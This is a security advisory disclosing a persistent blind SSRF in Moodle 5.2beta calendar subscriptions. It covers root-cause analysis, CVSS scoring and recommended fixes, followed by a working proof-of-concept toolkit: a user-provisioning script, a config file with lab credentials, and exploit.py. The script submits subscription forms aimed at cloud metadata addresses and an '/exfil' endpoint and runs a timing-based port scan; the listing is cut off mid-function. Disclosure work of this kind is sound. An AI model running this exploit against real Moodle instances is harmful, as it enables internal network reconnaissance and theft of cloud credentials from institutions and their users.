# Persistent Blind SSRF via Moodle Calendar Subscription (Any Authenticated User)

| Field | Value |
| --- | --- |
| Vulnerability name | Server-Side Request Forgery |
| Vulnerability type | software |
| Product name | Moodle LMS |
| Product vendor | Moodle |
| Product version | 5.2 |
| Product link | http://moodle.com |
| Product environment | web |
| Severity | High |
| CVSS score | 7.7 |
| CVSS vector | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N |
| Affected assets | 45986 |
| Affected users | 459860 |
| Date of reporting | 2026-04-10 |
| Vendor acknowledgement | No |
| Credit | 0xhamy |
| Date published | 2026-04-26T10:43:08.961923+00:00 |
| Last modified | 2026-05-03T19:17:05.908223+00:00 |

---

# Persistent Blind SSRF via Moodle Calendar Subscription (Any Authenticated User)

## Affected software, version & test date

| Field | Value |
|---|---|
| Product | Moodle (Learning Management System) |
| Version | 5.2beta — Build 20260327 |
| Component | `public/calendar/import.php` + `public/calendar/lib.php:2468` (`calendar_get_icalendar()`) |
| Tested on | Stock docker image, default configuration |
| Test date | 2026-04-09 |

## Vulnerability classes / CWE references

| CWE | Title | Relevance |
|---|---|---|
| **CWE-918** | Server-Side Request Forgery (SSRF) | Primary — the endpoint takes a URL from a low-privilege user and fetches it server-side via cURL. |
| **CWE-184** | Incomplete List of Disallowed Inputs | The default cURL host blocklist misses CGN (`100.64.0.0/10`), most of `169.254.0.0/16`, Alibaba/Oracle cloud metadata addresses. |
| **CWE-1188** | Insecure Default Initialization of Resource | The default blocklist shipped with Moodle 5.2beta has the gaps above. |
| **CWE-400** | Uncontrolled Resource Consumption | The subscription is stored permanently and re-fetched by cron at attacker-controlled intervals (minimum 1 hour). An attacker can create many subscriptions to amplify the SSRF. |

## Description

The Moodle calendar subscription feature lets any authenticated user import events from an external iCalendar URL. The subscription is stored in the `event_subscriptions` database table and periodically re-fetched by Moodle's cron system. The URL fetching is performed by `calendar_get_icalendar()` (`public/calendar/lib.php:2468`) which uses a bare `new \curl()` instance — routing through Moodle's `curl_security_helper` — and then parses the response body with `iCalendar::unserialize()`.

The vulnerability has three components:

1. **Low privilege requirement.** The only capability needed is `moodle/calendar:manageownentries`, which is granted to the `user` role by default (`public/calendar/lib.php:2065`). Every authenticated user — including self-registered students with no course enrollment — can create calendar subscriptions. No teacher role, no course editing rights needed.

2. **Same blocklist gaps as the grade-import SSRF.** The cURL security helper has the same default-config gaps: CGN range (`100.64.0.0/10`), most of IPv4 link-local (`169.254.0.0/16` except the literal `.169.254`), Alibaba Cloud metadata (`100.100.100.200`), Oracle Cloud metadata (`192.0.0.192`), and DNS hostnames resolving to any of the above.

3. **Persistence.** The subscription URL is stored in `mdl_event_subscriptions.url` with a `pollinterval` (minimum 1 hour, default 1 week) and re-fetched by cron. The SSRF fires:
   - **Twice on creation** — once during form validation (`managesubscriptions.php:133`) and once during `calendar_update_subscription_events()` (`import.php:129`)
   - **Indefinitely on schedule** — cron calls `calendar_update_subscription_events()` for every stored subscription whose `lastupdated + pollinterval < now()`
   - The attacker can log out, change their password, or even have their account suspended — the subscription persists and keeps firing.

This SSRF is **fully blind** — unlike the grade-import XML SSRF (which has a parser-error oracle that echoes attacker-controlled XML values), the iCalendar parser silently accepts any response body without reflecting data back. The attacker can distinguish three states — helper-blocked, connect-failed (via timing), or connect-succeeded (form accepted) — but cannot read the response body.

### Data flow

```
Form submission to /calendar/import.php → import.php:118 — require_sesskey() → import.php:116 — $form->get_data() → moodleform validation runs:
      → managesubscriptions.php:131 — $url = clean_param($data['url'], PARAM_URL)
      → managesubscriptions.php:133 — calendar_get_icalendar($url)
          → calendar/lib.php:2474 — $curl = new \curl()
          → calendar/lib.php:2476 — $curl->get($url)              ← SSRF #1 (validation)
          → lib/filelib.php:3777  — check_securityhelper_blocklist($url)
              → curl_security_helper::url_is_blocked($url)        ← helper check
          → calendar/lib.php:2483 — $ical->unserialize($calendar) ← silently accepts any body
  → (if validation passes: HTTP 200 response + non-empty body) → import.php:119 — calendar_add_subscription($formdata)        ← URL stored in DB → import.php:129 — calendar_update_subscription_events($id)
      → calendar/lib.php:2596 — calendar_get_icalendar($sub->url) ← SSRF #2 (post-save)

Cron (scheduled task, runs periodically): → calendar_update_subscription_events($id)
      → calendar/lib.php:2596 — calendar_get_icalendar($sub->url) ← SSRF #3, #4, #5... (persistent)
```

### Differences from grade-import SSRF (ssrf_1)

| Aspect | ssrf_1 (grade import XML) | ssrf_2 (calendar subscription) |
|---|---|---|
| Privilege required | Teacher (`moodle/grade:import`) | **Any authenticated user** (`moodle/calendar:manageownentries`) |
| Persistence | One-shot | **Persistent** — stored in DB, refetched by cron |
| Data exfiltration | **YES** — XML parser echoes `<assignment>` element values back via error message | NO — iCalendar parser is fully blind |
| IPv6 bypass | Blocked by PARAM_URL | Blocked by PARAM_URL (same limitation) |
| IPv4 CGN/link-local/Alibaba/Oracle | Works | Works (same gaps) |
| SSRF fires on | 1 request per manual trigger | 2 on creation + periodic cron |

## Permissions required

Any authenticated user. The default `user` role has `moodle/calendar:manageownentries` = 1 (ALLOW).

On a Moodle instance with email self-registration enabled (`auth_email` plugin), an attacker can create their own account and immediately exploit this — no admin or teacher involvement needed.

## Preconditions

| Precondition | Default state | Notes |
|---|---|---|
| Calendar feature enabled | Enabled by default | Core Moodle feature |
| User can add events | Yes — `moodle/calendar:manageownentries` granted to all authenticated users | Default role capability |
| SSRF targets reachable from Moodle server | Depends on network | CGN, link-local, and cloud metadata must be routable |
| `curlsecurityblockedhosts` admin setting | Default (vulnerable) | Same gaps as ssrf_1 |

## Root cause analysis

### 1. The form field uses PARAM_RAW

`public/calendar/classes/local/event/forms/managesubscriptions.php:63-64`:
```php
$mform->addElement('text', 'url', get_string('importfromurl', 'calendar'), ...); // Cannot set as PARAM_URL since we need to allow webcal:// protocol. $mform->setType('url', PARAM_RAW);
```

The comment explains the design choice: `webcal://` scheme support requires PARAM_RAW. This means the stored URL is whatever the user typed — no sanitisation beyond what the validation step does.

### 2. Validation applies PARAM_URL but only for the test fetch

`managesubscriptions.php:131`:
```php
$url = clean_param($data['url'], PARAM_URL);
```

This strips IPv6 bracketed URLs and invalid schemes. But the cleaned value is only used for the validation fetch — the **stored** value comes from `$formdata->url` which is PARAM_RAW.

### 3. The fetch uses a bare curl with no extra SSRF protection

`public/calendar/lib.php:2474-2476`:
```php
$curl = new \curl(); $curl->setopt(array('CURLOPT_FOLLOWLOCATION' => 1, 'CURLOPT_MAXREDIRS' => 5)); $calendar = $curl->get($url);
```

No additional URL validation, no scheme allowlist, no custom security helper configuration. The default `curl_security_helper` with its gappy blocklist is the only protection.

### 4. The iCalendar parser accepts anything

`iCalendar::unserialize()` silently accepts any input without throwing:
```
"plain text"        → empty calendar, 0 events, no exception "<html>...</html>"  → empty calendar, 0 events, no exception "{json: true}"      → empty calendar, 0 events, no exception
```

This means the form validation passes for **any URL that returns HTTP 200** regardless of content. The subscription is stored and the URL will be refetched by cron.

## Reproduction steps

### Prerequisites

The ssrf_2 PoC **reuses the lab network and target container from ssrf_1**. Run `poc/ssrf_1/setup_lab.sh` first if you haven't already.

```bash
cd poc/ssrf_2

# 1. Create venv (one-time)
python3 -m venv venv && ./venv/bin/pip install -r requirements.txt

# 2. Provision a student-level user (random suffix, idempotent)
./venv/bin/python setup_user.py

# 3. Prove the SSRF fires from a student account
./venv/bin/python exploit.py validate

# 4. Run the bypass survey
./venv/bin/python exploit.py bypass-survey

# 5. Create a persistent subscription pointing at an arbitrary URL
./venv/bin/python exploit.py subscribe http://100.64.0.10/exfil?t=persistent

# 6. Port scan (limited to port 80/443 by helper allowlist)
./venv/bin/python exploit.py portscan --host ssrf1-target -p 80,443,22,3306
```

### Expected output (validate)

```
┌─ login as ssrf2_u_… (student-level) at http://localhost:8080 ─ │ ✓ session ok │ ✓ sesskey = … └─

┌─ Firing calendar subscription SSRF → lab target /exfil ─ │ url = http://100.64.0.10/exfil?t=calsub_… │ ✓ SUBSCRIBED — form accepted (HTTP 303), elapsed=0.030s │ ✓ subscription is now stored and will re-fire on cron schedule └─

┌─ Cross-checking lab target logs for tag=calsub_… ─ │ ✓ 4 hit(s) from Moodle: │   [target] GET /exfil?t=calsub_…  from=::ffff:100.64.0.2 │   [target] !!! EXFIL HIT !!! tag=calsub_… from=::ffff:100.64.0.2 │   [target] GET /exfil?t=calsub_…  from=::ffff:100.64.0.2 │   [target] !!! EXFIL HIT !!! tag=calsub_… from=::ffff:100.64.0.2 └─

┌─ Verifying subscription persisted in database ─ │ ✓ id=…  name=probe_…  url=http://100.64.0.10/exfil?t=calsub_…  poll=86400 └─
```

The **4 hits** (2 pairs of GET + EXFIL HIT) correspond to the two fetches: one during form validation, one during post-save import. The subscription is now stored with `pollinterval=86400` (daily) and will re-fire on every cron run.

### Expected output (bypass-survey)

```
│  BLOCK BLOCK HELPER_BLOCKED          0.05s  loopback 127.0.0.1 │  BLOCK BLOCK HELPER_BLOCKED          0.05s  string 'localhost' │  BLOCK BLOCK HELPER_BLOCKED          0.05s  RFC1918 10.0.0.1 │  BLOCK BLOCK HELPER_BLOCKED          0.05s  AWS IMDSv1 .169.254 │  BLOCK BLOCK HELPER_BLOCKED          0.06s  port 6379 (not allowed) │  PASS  pass  SUBSCRIBED              0.03s  CGN IPv4 100.64.0.10 │  PASS  pass  SUBSCRIBED              0.02s  docker DNS ssrf1-target │  PASS  pass  CONNECT_FAILED         30.06s  link-local IPv4 169.254.0.1 │  PASS  pass  CONNECT_FAILED         30.06s  link-local IPv4 .169.253 │  PASS  pass  CONNECT_FAILED         30.11s  Alibaba metadata │  PASS  pass  CONNECT_FAILED         30.10s  Oracle metadata │  PASS  pass  SUBSCRIBED              0.10s  public example.com
```

- **SUBSCRIBED** (green) = SSRF fired, form accepted, subscription stored
- **CONNECT_FAILED** (yellow) = helper allowed URL, curl tried to connect, no service listening (SSRF confirmed by timing)
- **HELPER_BLOCKED** (red) = rejected before any network activity

## Validation artifacts

| File | Purpose |
|---|---|
| `setup_user.py` | Provisions a randomly-named student-level user via `docker exec`. No course enrollment, no teacher role. |
| `exploit.py` | Four subcommands: `validate`, `bypass-survey`, `subscribe URL`, `portscan` |
| `config.json` | Credentials + lab IPs (written by setup_user.py) |
| `requirements.txt` | `requests` |

Note: this PoC reuses the lab target container and network from `poc/ssrf_1/`. Run `poc/ssrf_1/setup_lab.sh` before using this PoC.

## Recommended fix

The same three fixes recommended for ssrf_1 apply here, since both share the same underlying `curl_security_helper` with the same default blocklist gaps:

1. **Tighten the default blocklist** in `public/admin/settings/security.php` to include CGN (`100.64.0.0/10`), the entire IPv4 link-local range (`169.254.0.0/16`), Alibaba/Oracle metadata IPs, and IPv6 link-local + ULA ranges.

2. **Fix the dual-stack DNS resolver** — replace `gethostbynamel()` (IPv4-only) with `dns_get_record()` (returns both A and AAAA records) in `curl_security_helper::get_host_list_by_name()`.

3. **Rate-limit subscription creation** — add a per-user cap on the number of URL-based calendar subscriptions (e.g., max 5). Currently there's no limit, so an attacker can create hundreds of persistent SSRF beacons.

Additionally, specific to this endpoint:

4. **Validate iCalendar content during form validation** — `iCalendar::unserialize()` silently accepts any body. The validation step should check that the parsed calendar contains at least one VEVENT or VTODO component before accepting the subscription. This would prevent arbitrary non-iCal URLs from being stored.

## Impact

Any authenticated user (including self-registered students) can:

- **Perform blind network reconnaissance** from the Moodle server's network vantage point, scanning for internal services on CGN, link-local IPv4, and unblocked cloud metadata addresses.
- **Create persistent SSRF beacons** that continue to fire after the attacker logs out, changes their password, or has their account suspended. The beacons persist until an admin manually deletes the subscription from the database.
- **Exfiltrate the Moodle server's IP address and network topology** by directing the SSRF at an attacker-controlled endpoint and observing the incoming request's source IP.
- **Interact with Alibaba Cloud and Oracle Cloud metadata services** on instances hosted on those platforms, potentially obtaining IAM credentials.
- **Amplify the SSRF** by creating many subscriptions with short poll intervals (minimum 1 hour), causing the Moodle server to make sustained outbound requests to arbitrary targets.

This cannot be used for **direct data exfiltration** (the iCalendar parser doesn't echo response content), but it **can** be combined with ssrf_1 (grade-import XML, which has a parser-error oracle) for a full read-chain if the attacker can obtain or escalate to a teacher role.

## CVSS 3.1

**Base score: 7.7 — High** **Vector:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`

| Metric | Value | Justification |
|---|---|---|
| Attack Vector (AV) | **Network (N)** | Exploitable via HTTP from the internet. |
| Attack Complexity (AC) | **Low (L)** | Single form submission. No timing dependencies, no race conditions. Default Moodle install is vulnerable. |
| Privileges Required (PR) | **Low (L)** | Any authenticated user — the `user` role (lowest non-guest privilege) has the required capability. Self-registration may provide this without any admin involvement. |
| User Interaction (UI) | **None (N)** | No victim involvement. |
| Scope (S) | **Changed (C)** | The vulnerability in Moodle's calendar subsystem allows the attacker to reach systems beyond Moodle's security authority — internal network services, cloud metadata endpoints, and arbitrary internet hosts. |
| Confidentiality (C) | **High (H)** | Can reach cloud metadata services on Alibaba/Oracle to obtain IAM credentials. Can perform network reconnaissance to discover internal services. |
| Integrity (I) | **None (N)** | Read-only SSRF (HTTP GET). |
| Availability (A) | **None (N)** | No reliable DoS demonstrated. |

## References

### Standards & frameworks

- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-184: Incomplete List of Disallowed Inputs](https://cwe.mitre.org/data/definitions/184.html)
- [CWE-1188: Insecure Default Initialization of Resource](https://cwe.mitre.org/data/definitions/1188.html)
- [OWASP Top 10 2021 — A10: Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

### Cloud metadata documentation

- [Alibaba Cloud ECS Instance Metadata](https://www.alibabacloud.com/help/en/ecs/user-guide/manage-instance-metadata) (`100.100.100.200`)
- [Oracle Cloud Infrastructure Instance Metadata](https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm) (`192.0.0.192`)

### IP range references

- [RFC 6598 — Shared Address Space (CGN)](https://datatracker.ietf.org/doc/html/rfc6598) (`100.64.0.0/10`)
- [RFC 3927 — IPv4 Link-Local Addresses](https://datatracker.ietf.org/doc/html/rfc3927) (`169.254.0.0/16`)

### Moodle source paths referenced

- `public/calendar/import.php` — form submission handler
- `public/calendar/lib.php:2468` — `calendar_get_icalendar()` — the SSRF primitive
- `public/calendar/lib.php:2222` — `calendar_add_subscription()` — stores the URL
- `public/calendar/lib.php:2588` — `calendar_update_subscription_events()` — cron refetch
- `public/calendar/lib.php:2065` — `calendar_get_allowed_types()` — capability check
- `public/calendar/classes/local/event/forms/managesubscriptions.php` — form definition + validation
- `public/lib/classes/files/curl_security_helper.php` — the security helper with gappy blocklist
- `public/admin/settings/security.php:175-191` — where the default blocklist is defined






















---

# config.json

Code:
```json
{ "base": "http://localhost:8080", "container": "moodle-app-moodle-1", "target_container": "ssrf1-target", "target_v4": "100.64.0.10", "user": {
    "username": "ssrf2_u_z29l9s6u",
    "password": "Pw!_GNoKjXszacP5aqal",
    "user_id": 7,
    "cap_calendar": true
  } }
```
















---

# setup_users.py

Code:
```python
#!/usr/bin/env python3 """ ssrf_2 — admin-side setup helper.

Creates a randomly-named regular user (no teacher role, no course enrollment). The user has only the default `user` role which grants `moodle/calendar:manageownentries` — enough to create calendar subscriptions.

Output: config.json consumed by exploit.py """ import argparse import json import secrets import string import subprocess import sys from pathlib import Path


SETUP_PHP = r""" define('CLI_SCRIPT', true); require('/var/www/moodle/config.php'); require_once($CFG->dirroot . '/user/lib.php');

$suffix = getenv('SUFFIX'); $pw     = getenv('PW'); $uname  = "ssrf2_u_$suffix";

// Create a plain user — no course, no teacher role $user = (object)[
    'username'   => $uname,
    'password'   => $pw,
    'firstname'  => 'SSRF2',
    'lastname'   => "User_$suffix",
    'email'      => "$uname@ssrf2.local",
    'auth'       => 'manual',
    'confirmed'  => 1,
    'mnethostid' => $CFG->mnet_localhost_id,
]; $uid = user_create_user($user, true);

// Verify the calendar capability $has_cal = has_capability('moodle/calendar:manageownentries',
                          context_system::instance(), $uid);

echo json_encode([
    'username'    => $uname,
    'password'    => $pw,
    'user_id'     => (int)$uid,
    'cap_calendar' => (bool)$has_cal,
]) . "\n"; """


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", default="moodle-app-moodle-1")
    ap.add_argument("--base", default="http://localhost:8080")
    ap.add_argument("--out", default=str(Path(__file__).resolve().parent / "config.json"))
    args = ap.parse_args()

    suffix = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    pw = "Pw!_" + secrets.token_urlsafe(12)

    print(f"[*] provisioning student-level user suffix={suffix}")
    proc = subprocess.run(
        ["docker", "exec", "-e", f"SUFFIX={suffix}", "-e", f"PW={pw}",
         args.container, "php", "-r", SETUP_PHP],
        capture_output=True, text=True,
    )
    if proc.returncode != 0:
        sys.stderr.write(f"[!] docker exec failed (rc={proc.returncode})\n{proc.stderr}")
        sys.exit(1)

    info = json.loads(proc.stdout.strip().splitlines()[-1])
    if not info.get("cap_calendar"):
        sys.stderr.write(f"[!] capability check failed: {info}\n")
        sys.exit(2)

    config = {
        "base": args.base,
        "container": args.container,
        "target_container": "ssrf1-target",    # reuse the lab from ssrf_1
        "target_v4": "100.64.0.10",
        "user": info,
    }
    Path(args.out).write_text(json.dumps(config, indent=2))
    print(f"[+] user: {info['username']} / {info['password']}")
    print(f"[+] user_id: {info['user_id']}")
    print(f"[+] cap calendar:manageownentries = {info['cap_calendar']}")
    print(f"[+] config written to {args.out}")


if __name__ == "__main__":
    main()

```














---

# exploit.py 

Code:
```python
#!/usr/bin/env python3 """ ssrf_2 — Moodle 5.2beta Calendar Subscription SSRF exploit.

Vulnerability ------------- /calendar/import.php lets ANY authenticated user create a calendar subscription from a URL. The form field uses PARAM_RAW for the URL (to allow webcal:// scheme), but the validation step applies clean_param(PARAM_URL) before fetching — so bracketed IPv6 URLs are stripped the same as in V-6.

The fetch itself uses `calendar_get_icalendar()` which constructs a bare `new curl()` and calls `$curl->get($url)`. This routes through `curl_security_helper`, which has the same default-config gaps as V-6:

  * CGN 100.64.0.0/10 — not blocked
  * 169.254.0.0/16 except the literal .169.254 — not blocked
  * Alibaba 100.100.100.200, Oracle 192.0.0.192 — not blocked
  * Hostnames resolving to any of the above — not blocked

Key differences from ssrf_1 (V-6, grade-import-xml):

  1. ANY authenticated user can fire this — `moodle/calendar:manageownentries`
     is granted to the default `user` role. No teacher role, no course
     enrollment needed.
  2. The subscription is STORED in `event_subscriptions` with its URL. Moodle's
     cron refetches it at `pollinterval` (default weekly). This makes it a
     PERSISTENT SSRF — the beacon keeps firing after the attacker logs out.
  3. The SSRF fires TWICE on creation: once during form validation, once during
     `calendar_update_subscription_events()` post-save.
  4. The response handling is BLIND for data content — `calendar_get_icalendar()`
     throws a generic exception if HTTP != 200 or if the body is empty. The
     iCalendar parser silently accepts any body, so any 200-OK response passes
     validation. No parser-error oracle like the grade-import XML_LEAK.

Modes ----- validate         Fire a probe at the lab target, cross-check via target logs. bypass-survey    Run the helper-bypass battery (same gaps as ssrf_1). subscribe URL    Create a persistent calendar subscription pointing at URL. portscan         Timing-based calibrated port scan (port 80/443 only). """ import argparse import json import re import statistics import subprocess import sys import time from pathlib import Path from urllib.parse import quote

try:
    import requests
except ImportError:
    sys.exit("error: pip install requests")

requests.packages.urllib3.disable_warnings() CONFIG_PATH = Path(__file__).resolve().parent / "config.json"

# ─── tty ─────────────────────────────────────────────────────────────────────
if sys.stdout.isatty():
    R, G, Y, C, M, D, X, BOLD = ("\033[31m", "\033[32m", "\033[33m",
                                 "\033[36m", "\033[35m", "\033[2m",
                                 "\033[0m", "\033[1m")
else:
    R = G = Y = C = M = D = X = BOLD = ""

def step(msg):  print(f"\n{C}┌─ {BOLD}{msg}{X}{C} ─{X}") def info(msg):  print(f"{C}│{X} {msg}") def ok(msg):    print(f"{C}│{X} {G}✓{X} {msg}") def bad(msg):   print(f"{C}│{X} {R}✗{X} {msg}") def warn(msg):  print(f"{C}│{X} {Y}!{X} {msg}") def foot():     print(f"{C}└─{X}")


def load_config():
    if not CONFIG_PATH.exists():
        sys.exit("config.json not found — run setup_user.py first")
    return json.loads(CONFIG_PATH.read_text())


# ─── moodle plumbing ─────────────────────────────────────────────────────────
def moodle_login(base, username, password):
    sess = requests.Session()
    sess.verify = False
    r = sess.get(f"{base}/login/index.php", timeout=10)
    m = re.search(r'name="logintoken" value="([^"]+)"', r.text)
    if not m:
        sys.exit("could not extract logintoken")
    r = sess.post(f"{base}/login/index.php",
                  data={"username": username, "password": password, "logintoken": m.group(1)},
                  allow_redirects=True, timeout=10)
    if "loginerrors" in r.text:
        sys.exit("login failed")
    return sess


def get_sesskey(sess, base):
    r = sess.get(f"{base}/calendar/import.php", timeout=10)
    m = re.search(r'"sesskey":"([^"]+)"', r.text)
    if not m:
        sys.exit("could not extract sesskey from calendar page")
    return m.group(1)


# ─── SSRF primitive ─────────────────────────────────────────────────────────
def fire_subscription(sess, base, sesskey, name, url, timeout=35.0):
    """Submit the calendar subscription form.

    Returns dict:
        success   bool   True if HTTP 303 redirect (form accepted)
        elapsed   float  wall-clock seconds
        status    int    HTTP status from Moodle
        error     str    error message if form was redisplayed
        sub_id    int|None  subscription ID if we can parse it
    """
    t0 = time.time()
    try:
        r = sess.post(
            f"{base}/calendar/import.php",
            data={
                "sesskey": sesskey,
                "_qf__core_calendar_local_event_forms_managesubscriptions": "1",
                "name": name,
                "importfrom": "1",           # CALENDAR_IMPORT_FROM_URL
                "url": url,
                "pollinterval": "86400",     # daily
                "eventtype": "user",
                "add": "Import calendar",
            },
            allow_redirects=False,
            timeout=timeout,
        )
    except requests.exceptions.Timeout:
        return {"success": False, "elapsed": time.time() - t0,
                "status": 0, "error": "client timeout", "sub_id": None}
    elapsed = time.time() - t0

    if r.status_code in (301, 302, 303):
        return {"success": True, "elapsed": elapsed,
                "status": r.status_code, "error": "", "sub_id": None}

    # Form redisplayed — extract error
    err = ""
    for m2 in re.finditer(r'id="id_error_(\w+)"[^>]*>\s*([^<]+)', r.text):
        field, msg = m2.group(1), m2.group(2).strip()
        if msg:
            err += f"{field}: {msg}; "
    if not err and "errorinvalidicalurl" in r.text:
        err = "Invalid calendar URL"
    if not err and "errorcannotimport" in r.text:
        err = "Cannot import"

    return {"success": False, "elapsed": elapsed,
            "status": r.status_code, "error": err.strip(), "sub_id": None}


def ssrf_probe(sess, base, sesskey, target_url, timeout=35.0):
    """One-shot SSRF probe via calendar subscription creation.

    Returns a simplified verdict dict compatible with the ssrf_1 convention.
    """
    name = f"probe_{int(time.time() * 1000)}"
    res = fire_subscription(sess, base, sesskey, name, target_url, timeout)

    if res["success"]:
        # Form accepted → SSRF fired, URL returned 200 OK
        verdict = "SUBSCRIBED"
    elif res["elapsed"] < 0.300 and not res["success"]:
        verdict = "HELPER_BLOCKED"
    elif "Invalid calendar URL" in res.get("error", ""):
        # Validation fetch threw (non-200 or curl error)
        if res["elapsed"] > 2.0:
            verdict = "CONNECT_FAILED"    # helper let it through, curl failed
        else:
            verdict = "HELPER_BLOCKED"    # fast reject
    elif res["elapsed"] > 5.0:
        verdict = "CONNECT_FAILED"        # slow timeout = real network attempt
    else:
        verdict = "REJECTED"

    res["verdict"] = verdict
    return res


# ─── helper ground truth ────────────────────────────────────────────────────
def helper_check_batch(container, urls):
    php = """
define('CLI_SCRIPT', true); require('/var/www/moodle/config.php'); $urls = json_decode(getenv('URLS'), true); $h = new \\core\\files\\curl_security_helper(); $out = []; foreach ($urls as $u) {
    $cleaned = clean_param($u, PARAM_URL);
    $out[$u] = [
        'helper_blocks' => (bool)$h->url_is_blocked($u),
        'param_url'     => $cleaned,
        'param_strips'  => ($cleaned === ''),
    ];
} echo json_encode($out); """
    proc = subprocess.run(
        ["docker", "exec", "-e", f"URLS={json.dumps(urls)}", container, "php", "-r", php],
        capture_output=True, text=True)
    if proc.returncode != 0:
        return {}
    return json.loads(proc.stdout)


# ─── commands ────────────────────────────────────────────────────────────────
def cmd_validate(args, sess, cfg, sesskey):
    tag = f"calsub_{int(time.time())}"
    v4 = cfg["target_v4"]

    step(f"Firing calendar subscription SSRF → lab target /exfil")
    url = f"http://{v4}/exfil?t={tag}"
    info(f"url = {url}")
    res = ssrf_probe(sess, cfg["base"], sesskey, url)
    if res["success"]:
        ok(f"SUBSCRIBED — form accepted (HTTP {res['status']}), elapsed={res['elapsed']:.3f}s")
        ok(f"subscription is now stored and will re-fire on cron schedule")
    else:
        bad(f"verdict={res['verdict']} error={res['error']} elapsed={res['elapsed']:.3f}s")
    foot()

    step(f"Cross-checking lab target logs for tag={tag}")
    logs = subprocess.run(
        ["docker", "logs", "--tail", "50", cfg["target_container"]],
        capture_output=True, text=True)
    hits = [ln for ln in (logs.stdout + logs.stderr).splitlines() if tag in ln]
    if hits:
        ok(f"{len(hits)} hit(s) from Moodle:")
        for h in hits:
            print(f"{C}│{X}   {D}{h}{X}")
    else:
        bad("no hits found in target logs")
    foot()

    step("Verifying subscription persisted in database")
    db = subprocess.run(
        ["docker", "exec", cfg["container"], "php", "-r", f"""
define('CLI_SCRIPT', true); require('/var/www/moodle/config.php'); $subs = $DB->get_records_select('event_subscriptions', "url LIKE '%{tag}%'"); foreach ($subs as $s) {{
    echo "  id=$s->id  name=$s->name  url=$s->url  poll=$s->pollinterval" . PHP_EOL;
}} if (empty($subs)) echo "  (none found)" . PHP_EOL; """], capture_output=True, text=True)
    for ln in db.stdout.strip().splitlines():
        ok(ln.strip())
    foot()


def cmd_bypass_survey(args, sess, cfg, sesskey):
    container = cfg["container"]
    v4 = cfg["target_v4"]

    cases = [
        ("loopback 127.0.0.1",              f"http://127.0.0.1/",               False),
        ("string 'localhost'",              f"http://localhost/",               False),
        ("RFC1918 10.0.0.1",                f"http://10.0.0.1/",                False),
        ("AWS IMDSv1 .169.254",             f"http://169.254.169.254/",          False),
        ("port 6379 (not allowed)",         f"http://{v4}:6379/",               False),
        ("CGN IPv4 100.64.0.10",            f"http://{v4}/",                     True),
        ("docker DNS ssrf1-target",         f"http://ssrf1-target/",             True),
        ("link-local IPv4 169.254.0.1",     f"http://169.254.0.1/",              True),
        ("link-local IPv4 .169.253",        f"http://169.254.169.253/",          True),
        ("Alibaba metadata",                f"http://100.100.100.200/",          True),
        ("Oracle metadata",                 f"http://192.0.0.192/",              True),
        ("public example.com",              f"http://example.com/",              True),
    ]

    step("Querying helper ground truth")
    truth = helper_check_batch(container, [u for _, u, _ in cases])
    ok(f"queried {len(truth)} URLs")
    foot()

    SUCCESS = {"SUBSCRIBED"}
    PARTIAL = {"CONNECT_FAILED"}
    FAIL    = {"HELPER_BLOCKED", "REJECTED"}

    def col_helper(b): return f"{R}BLOCK{X}" if b else f"{G}pass {X}"
    def col_live(v):
        if v in SUCCESS: return f"{G}{v:<20}{X}"
        if v in PARTIAL: return f"{Y}{v:<20}{X}"
        return f"{R}{v:<20}{X}"
    def col_elapsed(e, v):
        if e > 5: return f"{Y}{e:>7.2f}s{X}"
        if v in SUCCESS: return f"{G}{e:>7.2f}s{X}"
        return f"{e:>7.2f}s"

    step("Firing live probes")
    print(f"{C}│{X}  {'exp':<6}{'helper':<7}{'live':<20} {'elapsed':>8}  label")
    print(f"{C}│{X}  " + "─" * 75)
    for label, url, should_pass in cases:
        res = ssrf_probe(sess, cfg["base"], sesskey, url, timeout=35)
        t = truth.get(url, {})
        hb = t.get("helper_blocks", True)
        verdict = res["verdict"]
        exp = "PASS " if should_pass else "BLOCK"
        ground_pass = not hb
        match = (should_pass == ground_pass)
        exp_col = G if match else R

        print(f"{C}│{X}  {exp_col}{exp}{X} "
              f"{col_helper(hb)} "
              f"{col_live(verdict)} "
              f"{col_elapsed(res['elapsed'], verdict)}  {label}")
    foot()

    print()
    print(f"{BOLD}Verdict legend:{X}")
    print(f"  {G}SUBSCRIBED{X}     form accepted, subscription stored, SSRF confirmed")
    print(f"  {Y}CONNECT_FAILED{X} helper allowed URL but target was unreachable (SSRF still fired)")
    print(f"  {R}HELPER_BLOCKED{X} helper or PARAM_URL rejected the URL")
    print(f"  {R}REJECTED{X}       form rejected for another reason")


def cmd_subscribe(args, sess, cfg, sesskey):
    step(f"Creating persistent calendar subscription → {args.url}")
    name = f"ssrf2_{int(time.time())}"
    res = fire_subscription(sess, cfg["base"], sesskey, name, args.url, timeout=35)
    if res["success"]:
        ok(f"SUBSCRIBED (HTTP {res['status']}) elapsed={res['elapsed']:.3f}s")
        ok(f"name = {name}")
        ok(f"pollinterval = 86400 (daily re-fetch)")
        info(f"this URL will be re-fetched by Moodle's cron every 24 hours")
        info(f"the attacker can log out — the subscription persists")
    else:
        bad(f"failed: {res['error']} (HTTP {res['status']})")
    foot()


def cmd_portscan(args, sess, cfg, sesskey):
    ports = parse_ports(args.ports)
    host = args.host

    step(f"Calibration — 4 fast samples against lab target")
    samples = []
    for _ in range(4):
        r = ssrf_probe(sess, cfg["base"], sesskey, f"http://{cfg['target_v4']}/", timeout=10)
        samples.append(r["elapsed"])
        time.sleep(0.2)
    baseline = statistics.median(samples)
    threshold = baseline + 0.500
    ok(f"baseline = {baseline:.3f}s, threshold = {threshold:.3f}s")
    foot()

    step(f"Scanning {len(ports)} port(s) on {host}")
    print(f"{C}│{X}  {'port':<7}{'samples':<28}{'median':>8}  verdict")
    print(f"{C}│{X}  " + "─" * 60)
    for p in ports:
        url = f"http://{host}:{p}/"
        times, last_v = [], ""
        for _ in range(args.samples):
            r = ssrf_probe(sess, cfg["base"], sesskey, url, timeout=args.timeout)
            times.append(r["elapsed"])
            last_v = r["verdict"]
